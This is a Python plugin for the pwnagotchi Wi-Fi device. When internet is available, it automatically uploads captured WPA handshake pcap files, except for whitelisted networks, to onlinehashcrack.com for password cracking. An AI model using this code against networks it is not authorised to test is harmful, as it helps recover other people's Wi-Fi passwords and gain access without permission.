import os
import logging
import re
import requests
from threading import Lock
from pwnagotchi.utils import StatusFile
import pwnagotchi.plugins as plugins
from json.decoder import JSONDecodeError


class OnlineHashCrack(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '2.0.1'
    __license__ = 'GPL3'
    __description__ = 'This plugin automatically uploads handshakes to https://onlinehashcrack.com'

    def __init__(self):
        self.ready = False
        try:
            self.report = StatusFile('/root/.ohc_uploads', data_format='json')
        except JSONDecodeError as json_err:
            os.remove('/root/.ohc_uploads')
            self.report = StatusFile('/root/.ohc_uploads', data_format='json')
        self.skip = list()
        self.lock = Lock()

    def on_loaded(self):
        """
        Gets called when the plugin gets loaded
        """
        if 'email' not in self.options or ('email' in self.options and self.options['email'] is None):
            logging.error("OHC: Email isn't set. Can't upload to onlinehashcrack.com")
            return

        if 'whitelist' not in self.options:
            self.options['whitelist'] = []

        # remove special characters from whitelist APs to match on-disk format
        self.options['whitelist'] = set(map(lambda x: re.sub(r'[^a-zA-Z0-9]', '', x), self.options['whitelist']))

        self.ready = True
        logging.info("OHC: OnlineHashCrack plugin loaded.")

    def _filter_handshake_file(self, handshake_filename):
        try:
            basename = os.path.basename(handshake_filename)
            ssid, bssid = basename.split('_')
            # remove the ".pcap" from the bssid (which is really just the end of the filename)
            bssid = bssid[:-5]
        except:
            # something failed in our parsing of the filename. let the file through
            return True

        return ssid not in self.options['whitelist'] and bssid not in self.options['whitelist']

    def _upload_to_ohc(self, path, timeout=30):
        """
        Uploads the file to onlinehashcrack.com
        """
        with open(path, 'rb') as file_to_upload:
            data = {'email': self.options['email']}
            payload = {'file': file_to_upload}

            try:
                result = requests.post('https://api.onlinehashcrack.com',
                                       data=data,
                                       files=payload,
                                       timeout=timeout)
                if 'already been sent' in result.text:
                    logging.warning(f"{path} was already uploaded.")
            except requests.exceptions.RequestException as e:
                logging.error(f"OHC: Got an exception while uploading {path} -> {e}")
                raise e

    def on_internet_available(self, agent):
        """
        Called in manual mode when there's internet connectivity
        """
        with self.lock:
            if self.ready:
                display = agent.view()
                config = agent.config()
                reported = self.report.data_field_or('reported', default=list())

                handshake_dir = config['bettercap']['handshakes']
                handshake_filenames = os.listdir(handshake_dir)
                handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if
                                   filename.endswith('.pcap')]

                # pull out whitelisted APs
                handshake_paths = filter(lambda path: self._filter_handshake_file(path), handshake_paths)

                handshake_new = set(handshake_paths) - set(reported) - set(self.skip)

                if handshake_new:
                    logging.info("OHC: Internet connectivity detected. Uploading new handshakes to onlinehashcrack.com")

                    for idx, handshake in enumerate(handshake_new):
                        display.set('status',
                                    f"Uploading handshake to onlinehashcrack.com ({idx + 1}/{len(handshake_new)})")
                        display.update(force=True)
                        try:
                            self._upload_to_ohc(handshake)
                            if handshake not in reported:
                                reported.append(handshake)
                                self.report.update(data={'reported': reported})
                                logging.info(f"OHC: Successfully uploaded {handshake}")
                        except requests.exceptions.RequestException as req_e:
                            self.skip.append(handshake)
                            logging.error("OHC: %s", req_e)
                            continue
                        except OSError as os_e:
                            self.skip.append(handshake)
                            logging.error("OHC: %s", os_e)
                            continue
